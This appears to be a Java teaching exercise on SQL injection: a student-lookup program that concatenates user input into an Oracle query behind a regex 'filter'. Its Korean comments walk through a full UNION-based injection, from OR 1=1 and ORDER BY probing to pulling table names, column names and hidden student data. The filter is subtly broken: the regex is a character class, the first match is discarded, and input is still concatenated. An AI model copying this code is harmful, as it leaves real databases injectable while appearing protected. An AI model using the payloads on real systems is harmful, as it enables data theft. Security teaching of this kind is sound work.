package secure.sec01;

import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.util.Scanner;
import java.util.regex.*;

public class StudentInjectMainFilter {

	public static void main(String[] args) {
		// DB 연결
		DBConnect dbcon = new DBConnect();
		Connection con = dbcon.getConnection();
		PreparedStatement pstmt = null;
		ResultSet rs = null;
		Scanner sc = new Scanner(System.in);
		
		Pattern pattern = Pattern.compile("[^a-zA-Z0-9]|[select|delete|insert|order bt|create|alter|drop|all|union]"); // 필터링할 문구(정규식)를 문자열로 전달
		Matcher matcher = null; // 필터링 패턴과 매칭시 사용할 참조변수
		
		
		// java.sql 패키지의 모든 객체는 오류를 던지기 때문에 사용측에서는 예외처리가 반드시 필요
		try {
			System.out.print("학생 번호 입력: ");
			String stdNo = sc.nextLine();
			System.out.println(stdNo);
			
			matcher = pattern.matcher(stdNo.toLowerCase());
			
			boolean match = true;
			
			// 입력 값 검증 진행
			matcher.find(); // 실행한 정규식 패턴과 전달된 문자열을 매칭시켜서 정규식 패턴에 대한 문자열로 확인되면 true 반환
			while(matcher.find()) {
				match = false; // 입력된 문자가 필터링 됨
				break;
			}
			System.out.println(match);
			
			if(match) {
				// select 쿼리문 작성: 입력된 학생 번호에 대한 정보를 출력
				String sql = "select * from student where stdNo = '"+ stdNo +"'";
				System.out.println(sql);
				
				pstmt = con.prepareStatement(sql);
				
				rs = pstmt.executeQuery();
				
				// 제목출력
				System.out.println("------------ 학생 정보 조회 ------------");
				System.out.println("학생정보   \t 학생이름 \t\t\t\t 학년");
				
				// 필요내용만 출력: 모든 컬럼을 select 하지만 사용자에게 전달한 정보만 출력하는 방식으로 프로그램 개발
				while(rs.next()) {
					stdNo = rs.getString(1);
					String stdName = rs.getString(2);
					int stdYear = rs.getInt(3);
					
					// 한 행씩 출력
					System.out.format("%-10s\t %-20s\t\t\t\t %6d \n",stdNo, stdName,stdYear);
					/*
					 1. SQL INHECTION의 기본 공격 문구 사용 제공되는 컬럼의 정보를 확인
					 'OR 1=1 --
					 2. 정보를 제공하는 테이블의 컬럼의 수 확인
					 공격 문구를 통해 컬럼 수 확인
					 : ORDER BY 절을 적절히 활용하면 가능
					 'OR 1=1 ORDER BY 6 -- 정보 출력
					 'OR 1=1 ORDER BY 7 -- 정보 출력 안됨
					 : 지금 정보를 제공하고 있는 테이블의 컬럼수는 6개라는 것을 의미함
					 
					 3. UNION 공격을 통해서 컬럼들의 데이터 타입 확인
					 UNION절은 출력컬럼수와 컬럼의 데이터 타입이 동일해야하는 규칙이 있으므로
					 데이터 타입을 확인해 공격을 확장할 예정
					 
					 - 오라클은 DUAL이란 임시테이블을 사용할 수 있음.
					 공격자는 테이블 이름을 알 수 없으므로 DUAL 테이블 사용
					 'OR 1=1 UNION SELECT 'A', null, null, null, null, null from dual --
					 
					 첫 번째 컬럼 : 문자형
					 세 번째 컬럼 : null을 select 했지만 0이 출력됨(정수형)
					 네 번째 컬럼 :
					 = 'OR 1=1 UNION SELECT 'A', null, null, 'A', null, null from dual --
					 	위 공격에서 오류 없이 진행되었으므로 네 번째 컬럼은 문자열임
					 다섯 번째 컬럼 :
					 = 'OR 1=1 UNION SELECT 'A', null, null, 'A', 'A', null from dual --
					 	위 공격에서 오류 없이 진행되었지만 정보 없음 다섯 번째는 문자가 아님
					 = 'OR 1=1 UNION SELECT 'A', null, null, 'A', 0, null from dual --
					 	숫자로 UNION 했을때 정보조회가 안됨. 수치형도 아님(날짜 타입으로 추청가능)
					 
					 여섯 번째 컬럼 :
					 = 'OR 1=1 UNION SELECT 'A', null, null, 'A', 0, 'a' from dual --
					 	정보조회됨 문자타입
					 	
					 DataBase의 다른 정보를 획등
					 1. 프로그램이 사용하고 잇는 DB의 테이블 이름을 확인
					 	-- 주석기호를 사용하고 있으므로 오라클 DBMS임
					 	오라클은 사용자가 생성한 테이블 정보가 담긴 USER_TALBLES라는 테이블을 제공
					 	이 테이블의 읽기권한은 모든 사용자에게 있음
					 	TABLE_NAME 컬럼은 DB내 일반사용자 테이블의 이름 정보를 저장하고 있음, 문자열 컬럼임
					 	'OR 1=1 UNION SELECT TABLE_NAME,NULL,NULL,NULL,NULL,NULL FROM USER_TABLES --;
					 
					 2. 확인한 테이블 중 중요하다고 생각되는 테이블의 컬럼명 확인
					 	계정과 관련된 정보(중요 정보): CLIENT, MEMBER, STUDENT 이름등을 주로 사용함
					 	테이블에 대한 컬럼정보는 ALL_TAB_COLUMNS테이블에 컬럼정보를 저장해 놓고 있음
					 	'OR 1=1 UNION SELECT COLUMN_NAME,NULL,NULL,NULL,NULL,NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'STUDENT'--;
					 	
					 3. 확인된 컬럼명 이용해서 제공하고 있지 않은 컬럼의 데이터 획득
				
					 = 'OR 1=1 UNION SELECT STDADDRESS, TO_CHAR(STDBIRTH), TO_NUMBER(DPTNO), NULL, NULL, NULL FROM STUDENT;
					 
					 4. 보안대첵
					 	1. PREPARDE STATENEMT의 폴더 기능(?) 사용
					 	근본적인 해결책으로 많이 사용된다 이미 폴더기능을 사용하지 않은 경우 로직상 사용도 불가능하며 서버 운영중일 경우 코드수정에 어려움
					 	
					 	2. FILTERING: 입력되는 문자열을 검증해서 불필요한 문자열이 있으면 DB 질의를 거부함
					 	-- 필터링 시 특수문자와 더불어서 SQL 쿼리 키워드도 필터링을 진행해야 한다.
					 
					 */
				}
			}else {
				System.out.println("잘못된 입력입니다.");
			}
			
		}catch(Exception e) {
			//e.printStackTrace();
		}

	}

}
